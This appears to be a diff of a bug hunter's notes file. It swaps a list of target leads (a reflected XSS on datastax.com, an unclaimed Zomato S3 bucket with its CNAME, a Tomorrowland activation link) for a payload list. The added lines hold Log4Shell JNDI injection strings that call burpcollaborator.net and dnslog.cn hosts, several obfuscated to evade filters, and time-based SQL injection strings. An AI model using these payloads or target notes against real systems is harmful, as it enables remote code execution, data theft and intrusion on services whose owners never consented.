@@ -1,12 +1,22 @@
-https://cards-frame.twitter.com/i/cards/tfw/v1/uc/1348268347021008896#
+Squid Game Prize Box
+Final Prize Is More Than 100 ETH
+orwa'||DBMS_PIPE.RECEIVE_MESSAGE(CHR(98)||CHR(98)||CHR(98),10)||' 
 
-https://my.tomorrowland.com/activate?code=528517&email=asd%40tomorrowland.com
+org.apache.logging.log4j.LogManager.getLogger("whatever").error("not safe {}", "${jndi:ldap://127.0.0.1:1234/abc}")
 
-https://www.datastax.com/ reflect xss on respone <img class="img-fluid" src="... {XSS}"
 
-http://jumbo.zomato.com.s3.amazonaws.com
-<?xml version="1.0" encoding="UTF-8"?>
-<Error><Code>NoSuchBucket</Code><Message>The specified bucket does not exist</Message><BucketName>jumbo.zomato.com</BucketName><RequestId>7BA21B91DF4841CE</RequestId><HostId>oAuV6ByXrn3cXJkaUoPyhxP1l+bGXgK2O4u4dULnU5HZJhiVGZyGO/+FMp9nKtTTNgo8YQLTdxM=</HostId></Error>
-jumbo.zomato.com. 350 IN CNAME jumbo-elb-178985167.ap-southeast-1.elb.amazonaws.com.
 
-UBER:https://github.com/rgodlontonshaw/Entranze/blob/68fd83c68dbfe24ec6999ec91be2cfec7f7fbe28/src/main/java/com/godlontonconsulting/entranze/activity/HomeActivity.java
+${jndi:ldap://5lrnmk8dpab8bnvv0r8atfdbv21tpi.burpcollaborator.net/aa}
+${jndi:ldap://${jndi:ldap://12axtz.dnslog.cn/exp}/exp}
+${jndi:ldap://127.0.0.1:8888/abc}
+${jndi:${lower:l}${lower:d}a${lower:p}://loc${upper:a}ehz0ux2mqccikhz9nx5b8mrfo6uwil.burpcollaborator.net/rce}
+${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//5lrnmk8dpab8bnvv0r8atfdbv21tpi.burpcollaborator.net/a}
+
+${${lower:${lower:jndi}}:${lower:rmi}://zce3ok.dnslog.cn/poc}
+
+orwa' AND (SELECT 6377 FROM (SELECT(SLEEP(5)))hLTl)--
+OR boolean-based blind - WHERE or HAVING clause (NOT)
+OR boolean-based blind - WHERE or HAVING clause (NOT)
+' WAITFOR DELAY '0:0:5'--
+';WAITFOR DELAY '0:0:5'-- 
+',0)waitfor delay'0:0:05'--
